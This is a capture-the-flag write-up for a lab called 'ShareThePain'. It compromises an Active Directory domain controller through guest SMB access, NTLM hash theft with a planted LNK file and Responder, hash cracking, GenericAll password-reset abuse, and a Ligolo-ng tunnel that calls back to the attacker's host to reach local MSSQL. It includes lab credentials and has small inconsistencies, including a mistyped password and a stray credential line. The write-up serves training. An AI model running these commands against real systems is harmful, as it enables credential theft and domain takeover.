# ShareThePain

## ShareThePain

## **Scope and Objective**

**Objective:** You're a **penetration tester** on the **Hack Smarter Red Team**. Your mission is to infiltrate and seize control of the client's entire Active Directory environment. This isn't just a test; it's a full-scale assault to expose and exploit every vulnerability.

**Initial Access:** For this engagement, you've been granted direct access to the internal network but no credentials.

**Execution:** Your objective is simple but demanding: **enumerate, exploit, and own.** Your ultimate goal is not just to get in, but to achieve a **full compromise**, elevating your privileges until you hold the keys to the entire domain.

### Recon ,Scanning, and Enumeration

#### Rustscan

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-03-11 23:39:18Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hack.smarter, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hack.smarter, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.hack.smarter
| Issuer: commonName=DC01.hack.smarter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-10T08:46:20
| Not valid after:  2026-09-09T08:46:20
| MD5:     6a2c 465c bd6f 7693 93b7 0434 8dda d7df
| SHA-1:   0e42 3c3d 34bb 0964 0190 fe1e 456c 67cb 2308 5c32
| SHA-256: ce79 0fc9 6152 53a0 0ce9 f967 09d7 fe8f f283 d45a 3177 3aff c233 69da b707 e781

| rdp-ntlm-info: 
|   Target_Name: HACK
|   NetBIOS_Domain_Name: HACK
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hack.smarter
|   DNS_Computer_Name: DC01.hack.smarter
|   DNS_Tree_Name: hack.smarter
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-11T23:40:27+00:00
|_ssl-date: 2026-03-11T23:40:36+00:00; -1s from scanner time.
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
47001/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49698/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49702/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49714/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows 2016|2022|2012|2019|10 (93%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2016 (93%), Microsoft Windows Server 2022 (91%), Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2019 (88%), Microsoft Windows Server 2012 (87%), Microsoft Windows Server 2012 Data Center (87%), Windows Server 2019 (87%), Microsoft Windows 10 1703 (86%), Microsoft Windows 10 1607 (85%), Microsoft Windows 10 1511 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.98%E=4%D=3/11%OT=53%CT=%CU=34123%PV=Y%DS=3%DC=T%G=N%TM=69B1FD7E%P=x86_64-pc-linux-gnu)
SEQ(SP=F7%GCD=1%ISR=104%TI=I%CI=I%TS=9)
SEQ(SP=F8%GCD=1%ISR=103%TI=I%CI=I%TS=A)
OPS(O1=M510NW8ST11%O2=M510NW8ST11%O3=M510NW8NNT11%O4=M510NW8ST11%O5=M510NW8ST11%O6=M510ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M510NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=N)

Uptime guess: 0.009 days (since Wed Mar 11 19:27:31 2026)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=248 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 56443/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 21077/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 50157/udp): CLEAN (Failed to receive data)
|   Check 4 (port 44829/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2026-03-11T23:40:26
|_  start_date: N/A

```

* Our rustscan revealed a lot of interesting information for our recon and enumeration
* We do have `DC01.hack.smarter` `hack.smarter` which we need to add to our `/etc/hosts`

#### Initial access with our NULL Authentication

```bash
nxc smb hack.smarter -u '' -p ''
nxc smb hack.smarter -u 'guest' -p ''
```

![image.png](<../../.gitbook/assets/image (8).png>)

* **Null Session Success:** The first command `nxc smb hack.smarter -u '' -p ''` shows that the server accepts a connection with a completely blank username and password.
* **Guest Account Access:** The second command `-u 'guest' -p ''` confirms that the built-in `Guest` account is active and has no password.

#### Enumerate shares

```bash
nxc smb hack.smarter -u 'guest' -p '' --shares

```

![image.png](<../../.gitbook/assets/image 1 (7).png>)

* **`Share` (READ, WRITE):** This is your primary target. The fact that a Guest account has **WRITE** access is a major security misconfiguration. This allows for data exfiltration, malware hosting, or potentially poisoning files that other users might execute.

#### Enumerate Users

```bash
nxc smb 10.1.58.24 -u 'guest' -p '' --users
```

![image.png](<../../.gitbook/assets/image 2 (7).png>)

Enumerate Users - Rid Brute Forcing

```bash
nxc smb 10.1.58.24 -u 'guest' -p '' --rid-brute
```

![image.png](<../../.gitbook/assets/image 3 (7).png>)

```bash
nxc smb 10.1.58.24 -u 'guest' -p '' --rid-brute | grep  "SidTypeUser" | awk -F'\\' '{print $2}' | awk '{print $1}' 

```

![image.png](<../../.gitbook/assets/image 4 (7).png>)

Enumerating valid Usernames

```bash
kerbrute userenum --dc DC01.hack.smarter -d hack.smarter usernames.txt
```

![image.png](<../../.gitbook/assets/image 5 (7).png>)

* all the usernames are valid

Shares

![image.png](<../../.gitbook/assets/image 1 (7).png>)

![image.png](<../../.gitbook/assets/image 7 (7).png>)

* We were able to authenticate and the share is empty..
* If we have access to a share with `write permissions`, we can put there a malicious file. On the other end we can have responder to catch the hash.
* We can use `ntlm_thef.py` to perform this exploit https://github.com/Greenwolf/ntlm\_theft
*   Or we can also perform Write ShareLNK File Attacks

    ```bash
    nxc smb hack.smarter -u 'guest' -p '' \
        -M slinky \
        -o SERVER=10.1.58.24 SHARE=Share NAME=ShareThePain

    sudo responder -I tun0 -v -dP 

    smbclient \\\\10.1.58.24\\Share -U guest
    ```

    ![image.png](<../../.gitbook/assets/image 8 (6).png>)

OR

```bash
ntlm_theft.py --verbose --generate modern --server 10.1.58.24 --filename "ShareThePain2"

sudo responder -I tun0

```

Or https://github.com/overgrowncarrot1/SMB\_Killer.git

```bash
sudo python3 SMB_Killer.py -r 10.1.58.24 -l 10.200.39.91 -d hack.smarter -i tun0 -a share -U '' -P '' -A

```

![image.png](<../../.gitbook/assets/image 9 (7).png>)

Cracking the hash

```bash
hashcat -m 5600 -a0 hashes.txt /usr/share/wordlists/rockyou.txt

```

![image.png](<../../.gitbook/assets/image 10 (7).png>)

![image.png](<../../.gitbook/assets/image 11 (7).png>)

```bash
bob.ross:137Passowrd123!@#
```

### Authenticating as `Bob.ROSS`

```bash
nxc smb hack.smarter -u bob.ross -p '137Password123!@#'
```

![image.png](<../../.gitbook/assets/image 12 (7).png>)

* Valid Creds

### Bloodhound

We can use the provided creds `faraday:hacksmarter123` to obtain the loot

```bash
nxc ldap DC01.hack.smarter -u 'bob.ross' -p '137Password123!@#' --bloodhound --collection All --dns-server 10.1.58.24 
```

![image.png](<../../.gitbook/assets/image 13 (7).png>)

#### BloodHound Enumeration

![image.png](<../../.gitbook/assets/image 14 (7).png>)

* The user BOB.ROSS@HACK.SMARTER has GenericAll permissions to the user ALICE.WONDERLAND@HACK.SMARTER.
* This is also known as full control. This permission allows the trustee to manipulate the target object however they wish.

![image.png](<../../.gitbook/assets/image 15 (5).png>)

* The user ALICE.WONDERLAND@HACK.SMARTER is a member of the group REMOTE MANAGEMENT USERS@HACK.SMARTER.

### Mapping our Attack Vector

* Change Alice. wonderland password https://github.com/lineeralgebra/autobloodyAD?tab=readme-ov-file
* Connect to remote management with Alice

![image.png](<../../.gitbook/assets/image 16 (5).png>)

### User - Flag

```bash
Get-ChildItem -Path C:\ -Include 'user.txt' -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object { "=== $($_.FullName) ==="; Get-Content -Raw -Encoding UTF8 $_.FullName }
```

![image.png](<../../.gitbook/assets/image 17 (6).png>)

### Priveledge Escalation

![image.png](<../../.gitbook/assets/image 18 (4).png>)

* Since Tyler is in the All Domain Admin group , we need to find a way to do a lateral movement to become him.

![image.png](<../../.gitbook/assets/image 19 (6).png>)

* Permission was denied to perform anything with tyler

Other useful enumeration commands:

```bash
whoami /priv
net user alice.wonderland
ls -Force
```

![image.png](<../../.gitbook/assets/image 20 (5).png>)

* Nothing too interesting here.
* We can use a tool called `winpeas` but before that i like going to `C:\` and force for hidden items.

![image.png](<../../.gitbook/assets/image 21 (6).png>)

* The most interesting item in that list is the **`SQL2019`** directory.
* The SQL port was not accessible outside. We can conclude that it internal facing.

Check the permissions of that folder immediately to see if you can modify it

```bash

icacls C:\SQL2019
```

![image.png](<../../.gitbook/assets/image 22 (6).png>)

* Access denied

Check to see the running processes / Listening port (MSSQL-1433)

```bash
netstat -ano | findstr LISTENING
```

![image.png](<../../.gitbook/assets/image 23 (6).png>)

* The standard SQL port (**1433**) is bound to `127.0.0.1` (localhost), not `0.0.0.0` or the external IP. This means you cannot reach this database from your Kali machine; you can only interact with it from within your current shell as Alice.
*   We need to use Ligolo-ng for port forwarding.

    ```bash
    #On my VM
    sudo ip tuntap add user RedBlue mode tun ligolo
    sudo ip link set ligolo up
    ./proxy -selfcert

    # This adds a listener on the agent side (DC01) 
    # that redirects traffic to its own 127.0.0.1:1433
    listener_add --addr 0.0.0.0:1433 --to 127.0.0.1:1433
    listener_add --addr 127.0.0.1:1433 --to 127.0.0.1:1433

    #On My Vm on another terminal
    sudo ip route add 240.0.0.1 dev ligolo Special IP

    #***Attacking machine _ using agent***
    ./agent -connect 10.200.39.91:11601 -ignore-cert

    ```

    ![image.png](<../../.gitbook/assets/image 24 (6).png>)

    ![image.png](<../../.gitbook/assets/image 25 (6).png>)

    ![image.png](<../../.gitbook/assets/image 26 (6).png>)

#### Accessing the Database

Now, the agent is listening on its Ethernet IP (`10.1.58.24`) on port 1433 and forwarding it to its own localhost. Since you have a route to `10.1.58.24` via the `ligolo` interface, you can target the agent's internal IP directly from your machine.

![image.png](<../../.gitbook/assets/image 27 (5).png>)

```bash
impacket-mssqlclient alice.wonderland:RedBlue777@10.1.58.24
```
